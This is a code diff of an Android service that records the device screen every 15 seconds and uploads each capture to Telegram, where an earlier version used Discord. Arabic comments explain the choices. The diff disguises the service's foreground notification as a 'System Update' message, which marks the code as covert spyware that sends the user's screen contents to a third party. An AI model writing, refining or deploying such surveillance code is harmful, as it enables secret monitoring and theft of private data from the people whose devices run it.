@@ -1,16 +1,23 @@
 package com.tom5.monitor;
 
 import android.app.*;
-import android.content.*;
-import android.graphics.*;
-import android.hardware.display.*;
-import android.media.*;
-import android.media.projection.*;
-import android.os.*;
+import android.content.Context;
+import android.content.Intent;
+import android.graphics.Bitmap;
+import android.graphics.PixelFormat;
+import android.hardware.display.DisplayManager;
+import android.hardware.display.VirtualDisplay;
+import android.media.Image;
+import android.media.ImageReader;
+import android.media.projection.MediaProjection;
+import android.media.projection.MediaProjectionManager;
+import android.os.Handler;
+import android.os.IBinder;
 import android.util.DisplayMetrics;
 import android.view.WindowManager;
 import androidx.core.app.NotificationCompat;
-import java.io.*;
+import java.io.File;
+import java.io.FileOutputStream;
 import java.nio.ByteBuffer;
 
 public class ScreenService extends Service {
@@ -21,20 +28,18 @@ public class ScreenService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        // تشغيل الإشعار فوراً وبأعلى أولوية لمنع كراش تكنو
-        String cid = "system_core";
-        NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
-        nm.createNotificationChannel(new NotificationChannel(cid, "System", NotificationManager.IMPORTANCE_HIGH));
-        
-        startForeground(1, new NotificationCompat.Builder(this, cid)
-                .setContentTitle("System Update")
-                .setSmallIcon(android.R.drawable.ic_menu_info_details)
-                .setPriority(NotificationCompat.PRIORITY_MAX).build());
+        // إشعار الخدمة الأمامية (ضروري جداً)
+        String channelId = "sys_update";
+        NotificationChannel channel = new NotificationChannel(channelId, "System", NotificationManager.IMPORTANCE_LOW);
+        getSystemService(NotificationManager.class).createNotificationChannel(channel);
+        startForeground(1, new NotificationCompat.Builder(this, channelId)
+                .setContentTitle("جاري تحديث النظام")
+                .setSmallIcon(android.R.drawable.ic_menu_info_details).build());
 
         if (intent != null && intent.hasExtra("resData")) {
             int resCode = intent.getIntExtra("resCode", -1);
             Intent resData = intent.getParcelableExtra("resData");
-            MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
+            MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
             mediaProjection = mpm.getMediaProjection(resCode, resData);
             startCapture();
         }
@@ -42,39 +47,39 @@ public class ScreenService extends Service {
     }
 
     private void startCapture() {
-        DisplayMetrics m = new DisplayMetrics();
-        ((WindowManager) getSystemService(WINDOW_SERVICE)).getDefaultDisplay().getMetrics(m);
-        // تقليل الدقة للنصف لضمان العالمية (تكنو/سامسونج/تابلت)
-        imageReader = ImageReader.newInstance(m.widthPixels / 2, m.heightPixels / 2, PixelFormat.RGBA_8888, 2);
-        virtualDisplay = mediaProjection.createVirtualDisplay("Monitor", m.widthPixels / 2, m.heightPixels / 2, m.densityDpi, 
-                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, imageReader.getSurface(), null, null);
+        DisplayMetrics metrics = new DisplayMetrics();
+        WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
+        wm.getDefaultDisplay().getMetrics(metrics);
+        
+        imageReader = ImageReader.newInstance(metrics.widthPixels / 2, metrics.heightPixels / 2, PixelFormat.RGBA_8888, 2);
+        virtualDisplay = mediaProjection.createVirtualDisplay("Monitor", metrics.widthPixels / 2, metrics.heightPixels / 2, metrics.densityDpi, 16, imageReader.getSurface(), null, null);
 
         handler.postDelayed(new Runnable() {
             @Override public void run() {
-                saveAndUpload();
-                handler.postDelayed(this, 15000);
+                capture();
+                handler.postDelayed(this, 15000); // إرسال صورة كل 15 ثانية
             }
         }, 5000);
     }
 
-    private void saveAndUpload() {
-        try (Image img = imageReader.acquireLatestImage()) {
-            if (img != null) {
-                Image.Plane[] planes = img.getPlanes();
+    private void capture() {
+        try (Image image = imageReader.acquireLatestImage()) {
+            if (image != null) {
+                Image.Plane[] planes = image.getPlanes();
                 ByteBuffer buffer = planes[0].getBuffer();
-                Bitmap b = Bitmap.createBitmap(img.getWidth(), img.getHeight(), Bitmap.Config.ARGB_8888);
-                b.copyPixelsFromBuffer(buffer);
+                Bitmap bitmap = Bitmap.createBitmap(image.getWidth(), image.getHeight(), Bitmap.Config.ARGB_8888);
+                bitmap.copyPixelsFromBuffer(buffer);
                 
-                // حفظ بملف أولاً (حل مشكلة الكراش)
-                File f = new File(getCacheDir(), "capture.jpg");
-                try (FileOutputStream out = new FileOutputStream(f)) {
-                    b.compress(Bitmap.CompressFormat.JPEG, 50, out);
-                    DiscordSender.sendPhoto(f); // الرفع للديسكورد
+                File file = new File(getCacheDir(), "t.jpg");
+                try (FileOutputStream out = new FileOutputStream(file)) {
+                    bitmap.compress(Bitmap.CompressFormat.JPEG, 40, out);
+                    // الإرسال لتيليجرام خاوة
+                    TelegramSender.sendPhoto(file);
                 }
-                b.recycle();
+                bitmap.recycle();
             }
         } catch (Exception e) {}
     }
 
-    @Override public IBinder onBind(Intent i) { return null; }
+    @Override public IBinder onBind(Intent intent) { return null; }
 }
